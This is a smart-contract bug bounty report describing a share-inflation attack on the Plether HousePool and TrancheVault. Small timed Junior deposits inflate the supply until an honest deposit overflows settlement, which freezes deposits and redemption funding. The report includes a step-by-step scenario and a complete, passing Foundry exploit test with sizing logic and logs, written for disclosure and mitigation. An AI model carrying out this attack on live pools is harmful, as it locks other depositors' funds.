# \#99839 [SC-High] Junior share supply can be inflated until an ordinary Junior deposit overflows settleLpEpoch, freezing that deposit and all LP redemption funding

**Submitted on Nov 15th 2026 at 12:41:52 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99839
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Junior deposits activate in `settleLpEpoch` at the tranche's share price, Junior principal divided by Junior share supply. Settlement defers activation only when Junior principal is exactly zero, and nothing caps the shares minted. The Senior coupon lowers Junior principal without burning shares, so an attacker who activates small deposits while the coupon has left a few thousand atoms of principal multiplies the supply per USDG of principal each time. Once the supply per atom is high enough, the attacker refills Junior principal at that price, and the next ordinary Junior deposit overflows the share mint. Every settlement reverts, the depositor cannot cancel, and without new revenue to Junior the freeze lasts as long as the coupon takes to drain the principal the attacker left behind.

## Vulnerability Details

Settlement skips Junior activation only when Junior principal is exactly zero:

[packages/perps/src/HousePool.sol:914-920](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L920)
```solidity
DepositPhase memory juniorDepositPhase;
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
if (!juniorActivationDeferred) {
    juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
}
```

Deposit admission applies the [same test](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L494-L497), so requests are accepted while any principal is left. Activation then [quotes the batch](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1046-L1049) through `quoteDepositFromState`, with no fee for Junior:

[packages/perps/src/TrancheVault.sol:1407-1409](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1407-L1409)
```solidity
uint256 netAssets = feeBps == 0 ? assets : Math.mulDiv(assets, BPS - feeBps, BPS, Math.Rounding.Floor);
uint256 denominator = pricingAssets + assets + 1 - netAssets;
shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

With no fee the denominator is principal + 1, so a deposit `D` against principal `J` and supply `S` mints about `D · (S + 1000) / (J + 1)` shares. The coupon [takes Junior principal](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L76-L77) down to any residual and burns no shares, and `settleLpEpoch` [reconciles](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835) the coupon to the current second before it prices deposits. The coupon is linear in time, so an attacker can size one deposit to be drained to a chosen residual by the time the next epoch is settled. The next deposit then activates at a price close to zero, and the supply per atom of principal grows by about `D / (J + 1)` with each such activation.

Junior deposits have [no size cap](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1312-L1325). When the supply per atom is `r`, the tranche can hold at most about `2^256 / r` atoms before `totalSupply` overflows. An activation that takes principal past that amount panics in `Math.mulDiv` or in the [share mint](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1474), and the whole `settleLpEpoch` reverts, including the redemption funding earlier in the same call.

The depositor cannot get out. `cancelPendingDeposit` [reverts](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L860) for a matured Junior deposit unless its epoch was rejected, the tranche is [projected wiped](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1643-L1647) (zero principal with nonzero supply), or Senior is impaired.

`pause()` makes settlement skip the [deposit phase](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L903-L907), so redemption funding resumes, but the matured deposit stays where it is: it is not activated while paused, and the pause does not unlock cancellation. SECURITY.md describes the pause as [blocking activation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1150-L1152), not as releasing matured deposits. The same holds while the oracle is frozen, for example over a weekend: settlement [skips deposit activation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1139-L1145) then too, so redemptions are funded and the matured deposit stays stuck.

With no other change to Junior principal, the freeze ends when the coupon drains it to zero. A reverted settlement rolls back its own coupon checkpoint, so the coupon due keeps growing; once it reaches `J`, the next settlement's reconcile sets `J` to 0, activation is deferred and the deposit can be cancelled. That takes `J / c` seconds, where `c` is the coupon per second: about 2,537 USDG atoms a second, 219 USDG a day, for every 1,000,000 USDG of Senior at the release rate of 800 bps. The attacker chooses `J` before the freeze, so it chooses the freeze length. Trading revenue that reaches Junior changes this in two ways: a small amount adds to what the coupon has to drain, and enough of it, several thousand USDG in the test's setup, ends the freeze, because the deposit then mints fewer shares and fits.

### Attack scenario

The pool has 1,000,000 USDG of Senior and 300,000 USDG of Junior, with the release risk parameters, Senior caps and seeds, and the release coupon of 800 bps. A trader's profit of 300,000 USDG has left Junior with 888 USDG of principal, while all Junior shares are still outstanding and Senior is whole. Anyone can carry out every step; no role is needed.

1. **Inflate.** The attacker calls `TrancheVault.requestDeposit` on the Junior vault for 6.2 USDG, sized so that the coupon drains Junior to about 12,700 atoms, five seconds of coupon, at the settlement 97 epochs later. In the last of those epochs it requests the next deposit, about 9.14 USDG, one epoch of coupon, and from then on one in every epoch, so each request matures only at the settlement meant to activate it. A keeper's ordinary `settleLpEpoch` two seconds after each boundary activates it while Junior principal is about 12,700 atoms, which multiplies the supply per atom of principal by about 720, and the coupon drains the deposit again by the next boundary. After 21 such deposits, 189 USDG in total and 118 hours after the first one, the supply per atom is 3.4e67, which caps the tranche at about 3,356 USDG of principal.
2. **Refill.** The attacker deposits 250 USDG into Junior. It activates at the new price without overflowing, and Junior principal is now 250 USDG.
3. **Victim.** An LP requests a Junior deposit of 50,000 USDG. Admission accepts it, because principal is above zero. The LP's request matures at the next epoch boundary. A Senior LP requests a redemption in the same epoch.
4. **Freeze.** The next `settleLpEpoch` activates the LP's deposit, which takes principal past the cap. The share quote overflows and the whole call reverts with `Panic(0x11)`, with the Senior redemption unfunded. Every later call reverts the same way. The LP's `cancelPendingDeposit` reverts with `TrancheVault__DepositEpochAlreadyActive`.
5. **Pause.** The pauser or owner calls `HousePool.pause()`. Redemption funding resumes, but the LP's 50,000 USDG stays in escrow: it is not activated while paused, and cancellation stays blocked. Unpausing brings back the revert, and 24 hours after the freeze began both the settlement and the cancel still revert.
6. **End.** 30 hours after the freeze began, the coupon has drained the 250 USDG of Junior principal to Senior, Junior principal reaches 0, and the LP can cancel. The attacker sets the length: each extra 219 USDG of Junior principal adds a day, and with 2,200 USDG left the freeze lasts 267 hours.

## Impact Details

Temporary freezing of funds for at least 24 hours. An honest LP's matured Junior deposit can be neither activated nor cancelled, and every `settleLpEpoch` reverts, so no Senior or Junior redemption is funded. A pause, or a frozen-oracle window, restores redemption funding but not the deposit.

While the poisoned deposit is at the head of the queue, `settleLpEpoch` reverts for every caller, so no Senior or Junior redemption is funded until the pauser or owner pauses the pool or the oracle is frozen. Every Junior deposit that has matured stays frozen either way, neither activated nor cancellable, until the coupon drains Junior principal to zero or revenue lifts it far enough: at least 24 hours once the attacker leaves 219 USDG of Junior principal per 1,000,000 USDG of Senior, 30 hours in the first test and 267 hours in the second. Senior deposits behind it are not activated either. The attacker gains nothing; the frozen amount is whatever honest LPs deposit into Junior.

The attacker's cost does not depend on how much honest LPs deposit, and it sets the freeze length by what it leaves in Junior. The cost is what the attacker deposits, which the coupon moves to Senior LPs; gas is not included. The two tests run these:

| Attacker leaves in Junior | Attacker's deposits in total | LP's deposit | Frozen for | Frozen USDG per USDG deposited |
|---|---|---|---|---|
| 250 USDG | 439 USDG | 50,000 USDG | 30 hours | 113 |
| 2,200 USDG | 2,389 USDG | 10,000 USDG | 267 hours | 4 |

Conditions:
- Junior principal must be small while its shares are outstanding and Senior holds capital. In the test a trading loss takes almost all of it. A full Junior wipe followed by the first revenue gives the same state. Junior LPs leaving does not: redemption funding keeps Junior at the Senior share limit.
- Each epoch must be settled within the margin the attacker leaves, five seconds after the boundary in the test. `settleLpEpoch` is permissionless, so the attacker can send it itself, and another caller settling inside the margin serves the attacker as well. A settlement later than the margin lets the coupon take Junior principal to zero, and the attack stops. A wider margin tolerates more delay and needs more deposits.
- Another Junior deposit or trading revenue between two settlements changes Junior principal, and the attacker has to size its next deposit for the new amount.
- Trading must be active and entries must be allowed to settle: the pool not frozen, not degraded and with no deficit.
- Attacker cost in the first test: 189 USDG of inflation deposits plus the 250 USDG it leaves, 219 USDG per day of freeze per 1,000,000 USDG of Senior, all of which goes to Senior LPs. Damage: every honest Junior deposit that matures during the freeze, frozen for the whole freeze, and all redemption funding until a pause or a frozen-oracle window.
- A small amount of trading revenue raises `J` and lengthens the freeze, and enough of it ends the freeze, because the deposit then fits. Trader profit lowers `J` and shortens it.

## Recommended Mitigation

Defer Junior activation whenever the share price is degenerate, not only at exactly zero principal, for example when supply exceeds principal by more than a fixed bound:

```solidity
bool juniorActivationDeferred = juniorDepositPhase.pricingSupply != 0
    && juniorDepositPhase.pricingSupply > (juniorDepositPhase.pricingAssets + 1) * MAX_SHARES_PER_ASSET;
```

Apply the same bound in deposit admission, and in `_projectedTerminalWipe` so a deposit that matured under a deferred activation can be cancelled.

## References

- [HousePool.sol:914-920](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L920)
- [HousePool.sol:1046-1049](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1046-L1049)
- [TrancheVault.sol:1398-1410](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1410)
- [TrancheVault.sol:1474](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1474)
- [TrancheVault.sol:851-860](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L860)
- [HousePoolWaterfallAccountingLib.sol:76-77](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L76-L77)

## Proof of Concept

The first test runs the whole scenario with the release risk parameters, Senior caps and 1 USDG seeds from `DEPLOYMENT.md`. The loss that leaves Junior small comes from a trade through `OrderRouter.commitOrder` and `OrderRouter.executeOrder`. Deposits go through `TrancheVault.requestDeposit`, and every settlement is the permissionless `HousePool.settleLpEpoch`, called by a keeper two seconds after each epoch boundary. The attacker only requests deposits. Before each one it reads, as an off-chain simulation would, what Junior principal will be at the next settlement, and sizes the deposit from that, and it requests each deposit in the last epoch before the settlement meant to activate it. The test checks that the frozen settlement reverts with `Panic(0x11)` and that 24 hours later the settlement and the cancel still revert. In the first test the attacker leaves 250 USDG in Junior and the LP deposits 50,000 USDG. The second test runs the same attack with 2,200 USDG left and a 10,000 USDG deposit.

Paste the code into `test/POC.t.sol` at the repository root and run:

```bash
forge test --match-path test/POC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console} from "forge-std/console.sol";

contract Test is BasePerpTest {

    address internal seniorLp = makeAddr("seniorLp");
    address internal juniorLp = makeAddr("juniorLp");
    address internal trader = makeAddr("trader"); // its profit is the loss that almost wipes Junior
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim"); // honest LP who deposits into Junior afterwards
    address internal keeper = makeAddr("keeper");

    uint256 internal constant EPOCH = 1 hours;
    /// @dev The keeper settles each epoch two seconds after its boundary.
    uint256 internal constant KEEPER_DELAY = 2;
    /// @dev The attacker leaves five seconds of coupon in Junior at each expected settlement.
    uint256 internal constant MARGIN_SECONDS = 5;
    /// @dev Junior shares per atom of principal at which the tranche can hold about 2,250 USDG.
    uint256 internal constant TARGET_SHARES_PER_ATOM = type(uint256).max / 2250e6;
    uint256 internal constant JUNIOR_DEPOSIT = 300_000e6;
    /// @dev Revert data of an arithmetic overflow, `Panic(0x11)`.
    bytes internal constant OVERFLOW = abi.encodeWithSignature("Panic(uint256)", 0x11);

    function setUp() public override {
        super.setUp();
        // Release Senior caps from DEPLOYMENT.md.
        _setSeniorCapacity(40_000_000e6, 8000);
    }

    /// @dev Release risk parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev Release seeds from DEPLOYMENT.md: 1 USDG in each tranche.
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev The attacker leaves 250 USDG in Junior, and an LP deposits 50,000 USDG.
    function test_inflatedJuniorSupplyFreezesDepositAndSettlement() public {
        _run(250e6, 50_000e6);
    }

    /// @dev The same attack with a longer freeze and a smaller deposit: the attacker leaves 2,200 USDG in Junior,
    ///      and an LP deposits 10,000 USDG.
    function test_longerFreezeOfSmallerDeposit() public {
        _run(2200e6, 10_000e6);
    }

    function _run(
        uint256 refillAmount,
        uint256 victimDeposit
    ) internal {
        // Setup: Senior holds 1,000,000 USDG and Junior 300,000 USDG. A trader's long of 500,000 units, opened at
        // 1.00, is closed at 0.40 with a 300,000 USDG profit. The loss leaves Junior with a small residual of
        // principal, and Senior is whole.
        _fundJunior(juniorLp, JUNIOR_DEPOSIT);
        _fundSenior(seniorLp, 1_000_000e6);
        _fundTrader(trader, 20_000e6);
        _trade(false, 10_000e6, 1e8);
        _trade(true, 0, 0.4e8);
        (, uint256 juniorAfterLoss) = pool.getPendingDepositTrancheState();
        console.log("Junior principal after the loss (USDG):       ", juniorAfterLoss / 1e6);
        uint256 startTime = vm.getBlockTimestamp();
        uint256 settleTime = (vm.getBlockTimestamp() / EPOCH + 1) * EPOCH + KEEPER_DELAY;
        if (settleTime < vm.getBlockTimestamp() + juniorVault.LP_REQUEST_CUTOFF_DURATION() + KEEPER_DELAY) {
            settleTime += EPOCH;
        }

        // Step 1, inflate: every epoch the attacker requests one Junior deposit, sized so that the coupon drains
        // Junior to a few thousand atoms by the next settlement. The keeper's ordinary settlement then activates
        // the next deposit at that price.
        uint256 inflationDeposits;
        uint256 cycles;
        uint256 sharesPerAtom;
        while (true) {
            // The attacker requests each deposit in the last epoch before the settlement that should activate it,
            // so no earlier settlement finds it matured.
            if (vm.getBlockTimestamp() < settleTime - EPOCH) {
                vm.warp(settleTime - EPOCH);
            }
            (uint256 residual, uint256 supply, uint256 couponPerEpoch) = _project(settleTime);
            sharesPerAtom = supply / residual;
            bool refill = sharesPerAtom >= TARGET_SHARES_PER_ATOM / 2;
            uint256 deposit;
            uint256 epochs = 1;
            if (refill) {
                // Step 2, refill: the supply per atom is high enough, so this deposit sets how long Junior
                // principal lasts.
                deposit = refillAmount;
            } else {
                uint256 nextResidual = couponPerEpoch * MARGIN_SECONDS / EPOCH;
                if (sharesPerAtom * (nextResidual + couponPerEpoch) / nextResidual > TARGET_SHARES_PER_ATOM) {
                    // Last inflation step: leave a larger residual so the supply per atom lands on the target.
                    nextResidual = couponPerEpoch * sharesPerAtom / (TARGET_SHARES_PER_ATOM - sharesPerAtom);
                }
                // The coupon needs `epochs` epochs to drain what is there plus the smallest allowed deposit.
                while (nextResidual + epochs * couponPerEpoch < residual + pool.minTrancheDepositAssets()) {
                    epochs++;
                }
                deposit = nextResidual + epochs * couponPerEpoch - residual;
            }
            _requestJuniorDeposit(attacker, deposit);
            if (!refill) {
                inflationDeposits += deposit;
            }

            vm.warp(settleTime);
            vm.prank(keeper);
            pool.settleLpEpoch(0, 0);
            settleTime += epochs * EPOCH;
            cycles++;
            if (refill) {
                break;
            }
        }
        console.log("attacker's inflation deposits:                ", cycles - 1);
        console.log("their total (USDG):                           ", inflationDeposits / 1e6);
        console.log("hours from the first deposit to the refill:   ", (vm.getBlockTimestamp() - startTime) / 1 hours);
        console.log("Junior shares per atom of principal:          ", sharesPerAtom);
        console.log("most principal Junior can hold now (USDG):    ", type(uint256).max / sharesPerAtom / 1e6);
        console.log("Junior principal after the refill (USDG):     ", pool.juniorPrincipal() / 1e6);

        // Step 3, victim: an LP requests a Junior deposit. A Senior LP requests a redemption.
        uint256 victimRequest = _requestJuniorDeposit(victim, victimDeposit);
        uint256 shares = seniorVault.balanceOf(seniorLp) / 10;
        vm.prank(seniorLp);
        uint256 seniorRedeem = seniorVault.requestRedeem(shares, seniorLp, seniorLp);

        // Step 4, freeze: the settlement reverts for every caller with an arithmetic overflow, and the victim
        // cannot cancel.
        vm.warp(settleTime);
        uint256 frozenAt = settleTime;
        vm.prank(keeper);
        vm.expectRevert(OVERFLOW);
        pool.settleLpEpoch(0, 0);
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimRequest);

        // Step 5, pause: the owner pauses the pool. Redemption funding resumes, but the deposit stays frozen.
        pool.pause();
        vm.prank(keeper);
        pool.settleLpEpoch(0, 0);
        assertGt(seniorVault.claimableRedeemRequest(seniorRedeem, seniorLp), 0, "Senior redemption funded");
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimRequest);
        assertEq(juniorVault.pendingDepositRequest(victimRequest, victim), victimDeposit, "deposit not activated");

        // Unpausing brings back the revert.
        pool.unpause();
        vm.prank(keeper);
        vm.expectRevert(OVERFLOW);
        pool.settleLpEpoch(0, 0);

        // 24 hours after the freeze began nothing has changed.
        vm.warp(frozenAt + 24 hours);
        vm.prank(keeper);
        vm.expectRevert(OVERFLOW);
        pool.settleLpEpoch(0, 0);
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimRequest);

        // Step 6, end: with no trading revenue, the victim can cancel once the coupon has drained Junior principal
        // to zero.
        uint256 juniorPrincipal = type(uint256).max;
        while (juniorPrincipal > 0) {
            vm.warp(vm.getBlockTimestamp() + EPOCH);
            (, juniorPrincipal) = pool.getPendingDepositTrancheState();
        }
        vm.prank(victim);
        juniorVault.cancelPendingDeposit(victimRequest);
        assertEq(settlementToken.balanceOf(victim), victimDeposit, "victim gets the deposit back");
        console.log("victim's deposit frozen for (hours):          ", (vm.getBlockTimestamp() - frozenAt) / 1 hours);
        uint256 cost = inflationDeposits + refillAmount;
        console.log("attacker's deposits in total (USDG):          ", cost / 1e6);
        console.log("victim's deposit (USDG):                      ", victimDeposit / 1e6);
        console.log("frozen USDG per USDG the attacker deposited:  ", victimDeposit / cost);
    }

    /// @dev What the attacker reads off chain before each deposit: Junior principal and share supply as they
    ///      will be when the settlement at `settleTime` reaches its deposit phase, and the coupon of the epoch
    ///      after it.
    function _project(
        uint256 settleTime
    ) internal returns (uint256 juniorPrincipal, uint256 juniorSupply, uint256 couponPerEpoch) {
        uint256 snapshot = vm.snapshotState();
        vm.warp(settleTime);
        uint256 seniorPrincipal;
        (seniorPrincipal, juniorPrincipal) = pool.getPendingDepositTrancheState();
        juniorSupply = juniorVault.totalSupply();
        couponPerEpoch = seniorPrincipal * pool.seniorRateBps() * EPOCH / (10_000 * 365 days);
        vm.revertToState(snapshot);
    }

    function _requestJuniorDeposit(
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    /// @dev The trader commits a 500,000-unit long open or close through `OrderRouter.commitOrder`, and the keeper
    ///      executes it through `OrderRouter.executeOrder` at `price`. Only the Pyth update is mocked.
    function _trade(
        bool isClose,
        uint256 margin,
        uint256 price
    ) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: 500_000e18,
            marginDelta: margin,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory priceData = _mockPythUpdateData(price);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

}
```

Output:

```
Ran 2 tests for test/POC.t.sol:Test
[PASS] test_inflatedJuniorSupplyFreezesDepositAndSettlement() (gas: 19633073)
Logs:
  Junior principal after the loss (USDG):        888
  attacker's inflation deposits:                 21
  their total (USDG):                            189
  hours from the first deposit to the refill:    118
  Junior shares per atom of principal:           34497563100526978661709035159283734635877224291833484131248618093643
  most principal Junior can hold now (USDG):     3356
  Junior principal after the refill (USDG):      250
  victim's deposit frozen for (hours):           30
  attacker's deposits in total (USDG):           439
  victim's deposit (USDG):                       50000
  frozen USDG per USDG the attacker deposited:   113
[PASS] test_longerFreezeOfSmallerDeposit() (gas: 29621042)
Logs:
  Junior principal after the loss (USDG):        888
  attacker's inflation deposits:                 21
  their total (USDG):                            189
  hours from the first deposit to the refill:    118
  Junior shares per atom of principal:           34497563100526978661709035159283734635877224291833484131248618093643
  most principal Junior can hold now (USDG):     3356
  Junior principal after the refill (USDG):      2200
  victim's deposit frozen for (hours):           267
  attacker's deposits in total (USDG):           2389
  victim's deposit (USDG):                       10000
  frozen USDG per USDG the attacker deposited:   4

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
